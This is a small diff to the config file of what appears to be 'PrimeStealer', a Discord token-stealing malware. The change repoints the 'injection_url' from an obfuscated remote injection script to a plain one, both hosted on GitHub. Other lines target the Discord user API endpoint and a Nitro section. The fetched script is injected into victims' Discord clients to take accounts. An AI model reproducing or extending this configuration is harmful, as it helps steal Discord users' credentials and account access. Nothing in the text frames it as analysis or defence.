@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Prime Injection',
   embed_icon: 'https://raw.githubusercontent.com/SheLuvDx/PrimeStealer/main/img/prim.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/SheLuvDx/obfuscated-injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/SheLuvDx/injection/main/index.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
